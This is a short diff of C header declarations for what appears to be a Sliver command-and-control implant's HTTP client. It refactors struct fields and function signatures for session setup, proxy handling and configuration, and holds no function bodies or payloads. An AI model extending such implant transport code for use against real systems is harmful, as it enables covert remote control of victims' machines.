@@ -142,6 +142,7 @@ struct _SLIVER_HTTP_CLIENT {
 	OTP_DATA OtpData;
 	LPSTR lpPathPrefix;
 	DWORD dwMaxErrors;
+	PGLOBAL_CONFIG pGlobalConfig;
 };
 
 typedef enum {
@@ -166,8 +167,7 @@ typedef struct _MINISIGN_PUB_KEY {
 PHTTP_SESSION HttpSessionInit
 (
 	_In_ PURI pUri,
-	_In_ LPWSTR lpProxy,
-	_In_ LPWSTR lpProxyBypass
+	_In_ LPWSTR lpProxy
 );
 
 HINTERNET SendRequest
@@ -271,11 +271,14 @@ LPSTR CreateSessionURL
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
 
-PSLIVER_HTTP_CLIENT HttpInit();
+PSLIVER_HTTP_CLIENT HttpInit
+(
+	_In_ PGLOBAL_CONFIG pGlobalConfig,
+	_In_ PHTTP_PROFILE pProfile
+);
 
 BOOL HttpStart
 (
-	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pHttpClient
 );
 
@@ -310,6 +313,5 @@ PSLIVER_SESSION_CLIENT SessionInit
 PHTTP_CLIENT HttpClientInit
 (
 	_In_ PURI pUri,
-	_In_ LPWSTR lpProxy,
-	_In_ LPWSTR lpProxyBypass
+	_In_ LPWSTR lpProxy
 );
